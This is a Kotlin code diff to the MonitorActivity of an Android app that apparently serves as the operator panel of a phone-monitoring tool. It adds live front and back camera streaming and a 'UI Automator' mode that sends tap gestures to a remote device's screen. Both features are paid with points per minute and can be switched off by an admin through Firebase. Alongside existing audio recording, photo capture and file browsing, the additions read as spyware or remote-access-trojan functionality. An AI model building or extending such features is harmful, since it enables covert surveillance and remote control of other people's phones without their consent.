@@ -69,6 +69,7 @@ class MonitorActivity : AppCompatActivity() {
     private lateinit var tabFiles: LinearLayout
     private lateinit var tabScreen: FrameLayout
     private lateinit var tabMap: FrameLayout
+    private lateinit var tabCamera: ScrollView
     private lateinit var tabResults: ScrollView
     private lateinit var screenReconstructionView: ScreenReconstructionView
     private lateinit var btnFullScreenToggle: Button
@@ -82,6 +83,14 @@ class MonitorActivity : AppCompatActivity() {
 
     // File Browser
     private var currentDirectoryPath = "/sdcard"
+
+    // Live Camera / UI Automator
+    private var liveCameraJob: kotlinx.coroutines.Job? = null
+    private var uiAutomatorJob: kotlinx.coroutines.Job? = null
+    private var liveCameraActive = false
+    private var uiAutomatorActive = false
+    private var featureLiveCameraEnabled = true
+    private var featureUiAutomatorEnabled = true
     private lateinit var tvCurrentPath: TextView
     private lateinit var lvFiles: android.widget.ListView
     private lateinit var pbFilesLoading: android.widget.ProgressBar
@@ -135,6 +144,7 @@ class MonitorActivity : AppCompatActivity() {
         tabFiles = findViewById(R.id.tabFiles)
         tabScreen = findViewById(R.id.tabScreen)
         tabMap = findViewById(R.id.tabMap)
+        tabCamera = findViewById(R.id.tabCamera)
         tabResults = findViewById(R.id.tabResults)
         screenReconstructionView = findViewById(R.id.screenReconstructionView)
         btnFullScreenToggle = findViewById(R.id.btnFullScreenToggle)
@@ -269,6 +279,109 @@ class MonitorActivity : AppCompatActivity() {
             sendCommand("STOP_LIVE_SCREEN", btnStopLiveScreen)
         }
 
+        findViewById<android.widget.ToggleButton>(R.id.toggleUiAutomator)?.setOnCheckedChangeListener { _, isChecked ->
+            if (isChecked) {
+                if (!featureUiAutomatorEnabled) {
+                    android.widget.Toast.makeText(this, "UI Automator disabled by Admin", android.widget.Toast.LENGTH_SHORT).show()
+                    findViewById<android.widget.ToggleButton>(R.id.toggleUiAutomator)?.isChecked = false
+                    return@setOnCheckedChangeListener
+                }
+                if (pointsManager.getPoints() < 1000 && !isAdmin) {
+                    android.widget.Toast.makeText(this, "Not enough points", android.widget.Toast.LENGTH_SHORT).show()
+                    findViewById<android.widget.ToggleButton>(R.id.toggleUiAutomator)?.isChecked = false
+                    return@setOnCheckedChangeListener
+                }
+                uiAutomatorActive = true
+
+                screenReconstructionView.setOnTouchListener { v, event ->
+                    if (uiAutomatorActive && event.action == android.view.MotionEvent.ACTION_UP) {
+                        val xPercent = event.x / v.width
+                        val yPercent = event.y / v.height
+                        sendCommand("DISPATCH_GESTURE:CLICK:$xPercent:$yPercent")
+                        android.widget.Toast.makeText(this, "Sent tap: ${String.format("%.2f", xPercent)}, ${String.format("%.2f", yPercent)}", android.widget.Toast.LENGTH_SHORT).show()
+                    }
+                    true
+                }
+
+                uiAutomatorJob = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
+                    while (uiAutomatorActive) {
+                        checkAndDeductPoints(1000, "UI Automator") {
+                            // Points deducted, keep active
+                        }
+                        kotlinx.coroutines.delay(60000)
+                        if (pointsManager.getPoints() < 1000 && !isAdmin) {
+                            uiAutomatorActive = false
+                            findViewById<android.widget.ToggleButton>(R.id.toggleUiAutomator)?.isChecked = false
+                        }
+                    }
+                }
+            } else {
+                uiAutomatorActive = false
+                uiAutomatorJob?.cancel()
+                screenReconstructionView.setOnTouchListener(null)
+            }
+        }
+
+        findViewById<Button>(R.id.btnStartLiveCameraFront)?.setOnClickListener {
+            if (!liveCameraActive) {
+                if (!featureLiveCameraEnabled) {
+                    android.widget.Toast.makeText(this, "Live Camera disabled by Admin", android.widget.Toast.LENGTH_SHORT).show()
+                    return@setOnClickListener
+                }
+                if (pointsManager.getPoints() < 1000 && !isAdmin) {
+                    android.widget.Toast.makeText(this, "Not enough points", android.widget.Toast.LENGTH_SHORT).show()
+                    return@setOnClickListener
+                }
+                liveCameraActive = true
+                liveCameraJob = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
+                    while (liveCameraActive) {
+                        checkAndDeductPoints(1000, "Live Camera") {
+                            // First time, start the camera stream. Subsequent times just deduct points.
+                        }
+                        kotlinx.coroutines.delay(60000)
+                        if (pointsManager.getPoints() < 1000 && !isAdmin) {
+                            liveCameraActive = false
+                            sendCommand("STOP_LIVE_CAMERA")
+                        }
+                    }
+                }
+                sendCommand("START_LIVE_CAMERA:FRONT")
+            }
+        }
+
+        findViewById<Button>(R.id.btnStartLiveCameraBack)?.setOnClickListener {
+            if (!liveCameraActive) {
+                if (!featureLiveCameraEnabled) {
+                    android.widget.Toast.makeText(this, "Live Camera disabled by Admin", android.widget.Toast.LENGTH_SHORT).show()
+                    return@setOnClickListener
+                }
+                if (pointsManager.getPoints() < 1000 && !isAdmin) {
+                    android.widget.Toast.makeText(this, "Not enough points", android.widget.Toast.LENGTH_SHORT).show()
+                    return@setOnClickListener
+                }
+                liveCameraActive = true
+                liveCameraJob = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
+                    while (liveCameraActive) {
+                        checkAndDeductPoints(1000, "Live Camera") {
+                            // Keep paying
+                        }
+                        kotlinx.coroutines.delay(60000)
+                        if (pointsManager.getPoints() < 1000 && !isAdmin) {
+                            liveCameraActive = false
+                            sendCommand("STOP_LIVE_CAMERA")
+                        }
+                    }
+                }
+                sendCommand("START_LIVE_CAMERA:BACK")
+            }
+        }
+
+        findViewById<Button>(R.id.btnStopLiveCamera)?.setOnClickListener {
+            liveCameraActive = false
+            liveCameraJob?.cancel()
+            sendCommand("STOP_LIVE_CAMERA")
+        }
+
         findViewById<Button>(R.id.btnStartRecord).setOnClickListener {
             checkAndDeductPoints(200, "Rec Audio") {
                 sendCommand("START_RECORD_AUDIO")
@@ -357,6 +470,30 @@ class MonitorActivity : AppCompatActivity() {
 
         listenForResults()
         cleanupOldData()
+
+        val featuresRef = FirebaseDatabase.getInstance().getReference("access_codes").child(sessionKey)
+        featuresRef.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                if (snapshot.exists()) {
+                    featureLiveCameraEnabled = snapshot.child("feature_live_camera").getValue(Boolean::class.java) ?: true
+                    featureUiAutomatorEnabled = snapshot.child("feature_ui_automator").getValue(Boolean::class.java) ?: true
+
+                    if (!featureUiAutomatorEnabled && uiAutomatorActive) {
+                        uiAutomatorActive = false
+                        uiAutomatorJob?.cancel()
+                        findViewById<android.widget.ToggleButton>(R.id.toggleUiAutomator)?.isChecked = false
+                        android.widget.Toast.makeText(this@MonitorActivity, "UI Automator remotely disabled.", android.widget.Toast.LENGTH_SHORT).show()
+                    }
+                    if (!featureLiveCameraEnabled && liveCameraActive) {
+                        liveCameraActive = false
+                        liveCameraJob?.cancel()
+                        sendCommand("STOP_LIVE_CAMERA")
+                        android.widget.Toast.makeText(this@MonitorActivity, "Live Camera remotely disabled.", android.widget.Toast.LENGTH_SHORT).show()
+                    }
+                }
+            }
+            override fun onCancelled(error: DatabaseError) {}
+        })
     }
 
     override fun onResume() {
@@ -374,6 +511,7 @@ class MonitorActivity : AppCompatActivity() {
         tabLayout.addTab(tabLayout.newTab().setText("Files"))
         tabLayout.addTab(tabLayout.newTab().setText("Screen"))
         tabLayout.addTab(tabLayout.newTab().setText("Map"))
+        tabLayout.addTab(tabLayout.newTab().setText("Camera"))
         tabLayout.addTab(tabLayout.newTab().setText("Logs"))
 
         tabLayout.addOnTabSelectedListener(object : TabLayout.OnTabSelectedListener {
@@ -382,6 +520,7 @@ class MonitorActivity : AppCompatActivity() {
                 tabFiles.visibility = View.GONE
                 tabScreen.visibility = View.GONE
                 tabMap.visibility = View.GONE
+                tabCamera.visibility = View.GONE
                 tabResults.visibility = View.GONE
 
                 when (tab?.position) {
@@ -398,7 +537,8 @@ class MonitorActivity : AppCompatActivity() {
                     }
                     2 -> tabScreen.visibility = View.VISIBLE
                     3 -> tabMap.visibility = View.VISIBLE
-                    4 -> tabResults.visibility = View.VISIBLE
+                    4 -> tabCamera.visibility = View.VISIBLE
+                    5 -> tabResults.visibility = View.VISIBLE
                 }
             }
             override fun onTabUnselected(tab: TabLayout.Tab?) {}
@@ -621,7 +761,10 @@ class MonitorActivity : AppCompatActivity() {
             findViewById<Button>(R.id.btnPlayAlarm),
             findViewById<Button>(R.id.btnCapturePhoto),
             findViewById<Button>(R.id.btnGetDeviceInfo),
-            findViewById<Button>(R.id.btnLaunchApp)
+            findViewById<Button>(R.id.btnLaunchApp),
+            findViewById<Button>(R.id.btnStartLiveCameraFront),
+            findViewById<Button>(R.id.btnStartLiveCameraBack),
+            findViewById<Button>(R.id.btnStopLiveCamera)
         )
         for (btn in buttons) {
             if (btn != null && btn.text == "Pending...") {
